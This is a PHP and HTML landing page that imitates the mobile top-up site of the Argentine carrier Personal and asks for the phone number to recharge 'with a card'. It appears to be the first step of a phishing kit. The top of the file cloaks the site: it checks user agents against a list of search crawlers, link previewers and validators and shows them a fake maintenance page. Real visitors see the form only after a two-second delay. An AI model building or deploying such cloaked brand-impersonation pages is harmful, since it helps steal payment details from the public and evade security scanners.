<?php
// ANTI-BOT PROTECTION
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Lista de bots conocidos
$bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'validator', 'bot', 'crawl', 'spider'];

// Detectar si es un bot
$is_bot = false;
foreach($bots as $bot) {
    if(strpos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Si es bot, mostrar página falsa
if($is_bot) {
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sitio en Mantenimiento</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
            h1 { color: #333; }
            p { color: #666; }
        </style>
    </head>
    <body>
        <h1>Sitio en Mantenimiento</h1>
        <p>Estamos realizando mejoras. Vuelve pronto.</p>
        <p>We are performing maintenance. Please come back soon.</p>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Carga Virtual Online</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="stylesheet" type="text/css" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/op/normalizer.css">
    <link rel="stylesheet" href="css/op/styles.css">
    <link rel="stylesheet" href="css/op/index.css">
    <style>
        /* FIX PARA INPUT Y BOTÓN */
        * {
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
        }
        
        body {
            background-color: rgb(229, 229, 229);
            overflow-x: hidden;
        }
        
        /* LOADER */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00AEEF;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* FIX INPUT */
        .custom-input {
            width: 100% !important;
            max-width: 100% !important;
            padding: 14px 16px !important;
            font-size: 16px !important;
            border: 1px solid #ddd !important;
            border-radius: 6px !important;
            background: #fff !important;
            color: #333 !important;
            box-sizing: border-box !important;
        }
        
        .custom-input:focus {
            outline: none !important;
            border-color: #00AEEF !important;
            box-shadow: 0 0 0 3px rgba(0, 174, 239, 0.1) !important;
        }
        
        .custom-input::placeholder {
            color: #999 !important;
            opacity: 1 !important;
        }
        
        /* FIX LABEL */
        .label-input {
            display: block !important;
            font-size: 15px !important;
            font-weight: 600 !important;
            color: #333 !important;
            margin-bottom: 10px !important;
        }
        
        /* FIX HELP TEXT */
        .help-text {
            font-size: 13px !important;
            color: #666 !important;
            margin-top: 8px !important;
            display: block !important;
        }
        
        /* FIX BOTÓN */
        .btn-personal {
            width: 100% !important;
            max-width: 100% !important;
            padding: 16px !important;
            font-size: 16px !important;
            font-weight: 600 !important;
            border: none !important;
            border-radius: 8px !important;
            background-color: #00AEEF !important;
            color: #fff !important;
            cursor: pointer !important;
            transition: all 0.3s !important;
            margin-top: 20px !important;
            display: block !important;
        }
        
        .btn-personal:disabled {
            background-color: #B0B8C4 !important;
            cursor: not-allowed !important;
            opacity: 0.7 !important;
        }
        
        .btn-personal:not(:disabled):hover {
            background-color: #0099CC !important;
        }
        
        .btn-personal:not(:disabled):active {
            transform: scale(0.98);
        }
        
        /* FIX FORM GROUP */
        .form-group {
            margin-bottom: 20px !important;
            width: 100% !important;
        }
        
        /* ERROR MESSAGE */
        .error-message {
            color: #dc3545 !important;
            font-size: 13px !important;
            margin-top: 8px !important;
            display: none !important;
        }
        
        /* DISCLAIMER */
        .disclamer {
            font-size: 12px !important;
            color: #666 !important;
            line-height: 1.4 !important;
            margin-top: 15px !important;
            text-align: center !important;
            padding: 0 10px !important;
        }
        
        /* RESPONSIVE */
        @media (min-width: 576px) {
            .btn-personal {
                width: auto !important;
                min-width: 200px !important;
                display: inline-block !important;
            }
            
            .disclamer {
                font-size: 13px !important;
            }
        }
    </style>
</head>
<body>
    <!-- Loader anti-bot -->
    <div id="loader"><div class="spinner"></div></div>
    
    <div class="container-fluid" id="mainContent" style="display:none;">
        <div class="row">
            <div class="col-12 p-0">
                <header-component _nghost-hol-c9="">
                    <header _ngcontent-hol-c9="" class="header">
                        <nav _ngcontent-hol-c9="" class="px-0 pt-0">
                            <div _ngcontent-hol-c9="" class="d-flex justify-content-between align-items-center">
                                <div _ngcontent-hol-c9="" class="ml-3 ml-md-5 bd-highlight">
                                    <img _ngcontent-hol-c9="" src="assets/flow.svg" class="pl-md-4 img-fluid size-logo">
                                </div>
                                <div _ngcontent-hol-c9="" class="mr-3 mr-md-5 bd-highlight">
                                    <div _ngcontent-hol-c9="" class="d-none d-sm-block">
                                        <img _ngcontent-hol-c9="" src="assets/secure.svg" class="pr-md-4">
                                    </div>
                                    <div _ngcontent-hol-c9="" class="d-block d-sm-none">
                                        <img _ngcontent-hol-c9="" src="assets/secure-mobile.svg" class="pr-md-4 pr-2">
                                    </div>
                                </div>
                            </div>
                        </nav>
                    </header>
                </header-component>
                
                <phone-number _nghost-hol-c41="">
                    <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center mt-0 mt-sm-5">
                        <div _ngcontent-hol-c41="" class="col-12">
                            <h1 _ngcontent-hol-c41="" class="title">Recargá tu línea Personal con tarjeta</h1>
                        </div>

                        <img src="logo.jpg" alt="logoo.jpg" width="350" height="300" style="max-width: 100%; height: auto;">

                        <div _ngcontent-hol-c41="" class="row justify-content-center align-items-center">
                            <div _ngcontent-hol-c41="" class="col-11 col-sm-8 mb-sm-3">
                                <form action="step2.php" method="POST" class="w-sm-75 mb-3" id="phoneForm">
                                    <div _ngcontent-hol-c41="" class="form-group">
                                        <label _ngcontent-hol-c41="" for="phone" class="label-input">
                                            Ingresá el número de línea a recargar
                                        </label>
                                        <input 
                                            _ngcontent-hol-c41="" 
                                            type="tel" 
                                            name="phone" 
                                            id="phone" 
                                            placeholder="Ej: 1153394581" 
                                            class="custom-input" 
                                            maxlength="10" 
                                            autocomplete="off">
                                        <small _ngcontent-hol-c41="" class="form-text help-text">
                                            Agregá el código de área sin 0 más número sin 15
                                        </small>
                                        <div class="error-message" id="phoneError">
                                            El número debe tener exactamente 10 dígitos numéricos
                                        </div>
                                    </div>
                                    
                                    <div _ngcontent-hol-c41="" class="text-center">
                                        <button 
                                            _ngcontent-hol-c41="" 
                                            type="submit" 
                                            id="principalButton" 
                                            class="btn btn-personal" 
                                            disabled>
                                            Siguiente
                                        </button>
                                        <h3 _ngcontent-hol-c41="" class="disclamer">
                                            *Recordá que si tenés prestación básica universal no aplica el 20% adicional en tus recargas
                                        </h3>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    
                    <div _ngcontent-hol-c41="" class="row justify-content-center align-items-left pb-4">
                        <div _ngcontent-hol-c41="" class="info col-11 col-sm-9">
                            <div _ngcontent-hol-c41="" class="m-sm-0 m-md-5 m-lg-2 m-xl-5">
                                <h2 _ngcontent-hol-c41="" class="title-info">¿Cómo funciona la recarga virtual Personal?</h2>
                                <p _ngcontent-hol-c41="" class="description-info">
                                    ¿Te quedaste sin crédito y no sabes cómo hacer para seguir conectado? La recarga virtual es una manera rápida y simple de adquirir más saldo y, al mismo tiempo, conseguir beneficios extras. 
                                    <br _ngcontent-hol-c41="">
                                    Realizando una recarga virtual a través de cualquiera de nuestros canales obtenés un 20% de descuento para usar como quieras. Conocé a continuación cómo podés recargar desde la web y la app Mi Personal, dos canales súper accesibles y prácticos para usar. 
                                    <a _ngcontent-hol-c41="" class="readMore">Ver más</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </phone-number>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/query-form.js"></script>
    <script src="javascript/poper.min.js"></script>
    <script src="javascript/bootstrap.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script src="javascript/custom.js"></script>
    <script>
        // Anti-bot: Esperar 2 segundos antes de mostrar contenido
        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }, 2000);
        
        $(document).ready(function(){
            // Máscara para solo permitir números
            if (typeof $.fn.mask !== 'undefined') {
                $('#phone').mask('0000000000');
            }

            // Función de validación
            function validarNumero(){
                var telefono = $('#phone').val().replace(/\D/g, '');
                var error = $('#phoneError');
                var boton = $('#principalButton');

                if(telefono.length === 10){
                    error.hide();
                    boton.prop('disabled', false);
                    return true;
                } else {
                    if(telefono.length > 0) {
                        error.show();
                    } else {
                        error.hide();
                    }
                    boton.prop('disabled', true);
                    return false;
                }
            }

            // Validar cuando se escribe en el campo
            $('#phone').on('input change', function(){
                validarNumero();
            });

            // Validar cuando se intenta enviar el formulario
            $('#phoneForm').submit(function(e){
                if(!validarNumero()){
                    e.preventDefault();
                    $('#phone').focus();
                }
            });

            // Solo números en el input
            $('#phone').on('keypress', function(e){
                if (e.which < 48 || e.which > 57) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>